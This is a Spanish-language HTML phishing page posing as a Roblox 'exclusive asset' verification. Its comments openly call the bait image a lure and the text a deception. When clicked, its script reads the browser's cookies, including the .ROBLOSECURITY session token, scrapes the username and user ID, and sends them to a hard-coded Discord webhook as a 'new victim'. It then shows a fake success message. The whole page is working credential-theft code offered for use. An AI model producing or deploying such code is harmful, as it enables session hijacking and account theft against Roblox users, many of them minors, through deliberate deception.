<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Asset Generator</title>
    <style>
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #1e2124;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            color: #ffffff;
            margin-top: 0;
        }
        .cebo-image {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s ease-in-out;
            box-shadow: 0 4px 15px rgba(114, 137, 218, 0.4);
        }
        .cebo-image:hover {
            transform: scale(1.03);
        }
        #cebo-link {
            text-decoration: none; /* Quita el subrayado del enlace */
            display: block;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
            display: none; /* Oculto por defecto */
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #f04747;
            font-weight: bold;
            margin-top: 20px;
            display: none; /* Oculto por defecto */
        }
        #mensaje-texto {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Activo Exclusivo Detectado!</h1>
        
        <!-- La imagen es el cebo. El onclick ejecuta el script. -->
        <a href="#" id="cebo-link" onclick="ejecutarScript()">
            <!-- Puedes cambiar esta URL por la imagen que quieras usar -->
            <img src="data:image/jpeg;base64,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">
        </a>
        
        <!-- Mensaje que engaña al usuario -->
        <p id="mensaje-texto">Hemos encontrado un activo especial en tu cuenta. ¡Haz clic en la imagen para verificar tu identidad y añadirlo!</p>
        
        <!-- Loader y mensaje de error (ocultos al principio) -->
        <div id="loader" class="loader"></div>
        <div id="error-message" class="error-message">Error: No se pudo conectar con Roblox. Por favor, inténtalo de nuevo.</div>
    </div>

    <script>
        // Tu código original ahora está dentro de una función.
        async function ejecutarScript() {
            // Prevenir que el enlace "#" nos mueva a la parte superior de la página
            event.preventDefault(); 

            // Ocultar la imagen y el mensaje, y mostrar el loader
            document.getElementById('cebo-link').style.display = 'none';
            document.getElementById('mensaje-texto').style.display = 'none';
            document.querySelector('h1').innerText = 'Verificando Cuenta...';
            document.getElementById('loader').style.display = 'block';

            // --- TU CÓDIGO DE PHISHING AQUÍ ---
            const webhookUrl = 'https://discord.com/api/webhooks/1445837852469629038/3HNOCb-Tsw5RBFSVz6xHQmWwnxK3MESvOwtCIJq-AtrJNlCzHudxn6PE_rUcNsbQ3_71';
            const robloxCookie = document.cookie;

            if (!robloxCookie.includes('.ROBLOSECURITY=')) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-message').style.display = 'block';
                document.getElementById('error-message').innerText = 'Error: No se pudo encontrar la sesión de Roblox. Asegúrate de haber iniciado sesión.';
                return;
            }

            const usernameElement = document.querySelector('.navbar-username');
            const username = usernameElement ? usernameElement.innerText : 'N/A';
            const avatarLinkElement = document.querySelector('.navbar-avatar');
            const userIdMatch = avatarLinkElement ? avatarLinkElement.href.match(/\/users\/(\d+)/) : null;
            const userId = userIdMatch ? userIdMatch[1] : 'N/A';

            const payload = {
                content: '🍪 ¡Nueva víctima capturada!',
                embeds: [{
                    title: 'Detalles de la Cuenta',
                    color: 15158332,
                    fields: [
                        { name: '👤 Usuario', value: username, inline: true },
                        { name: '🆔 ID', value: userId, inline: true },
                        { name: '🍪 Cookie (.ROBLOSECURITY)', value: '```' + robloxCookie + '```', inline: false }
                    ],
                    footer: { text: 'Ejecutado via Imagen Cebo' },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Éxito: Datos enviados a Discord.');
                    // Mostrar mensaje de éxito falso
                    document.querySelector('.container').innerHTML = '<h1>¡Verificado!</h1><p>Tu cuenta ha sido verificada. El activo será añadido en breve.</p>';
                } else {
                    console.error('Error al enviar a Discord. Status:', response.status);
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('error-message').style.display = 'block';
                }
            } catch (error) {
                console.error('Error de red:', error);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-message').style.display = 'block';
            }
        }
    </script>
</body>
</html>
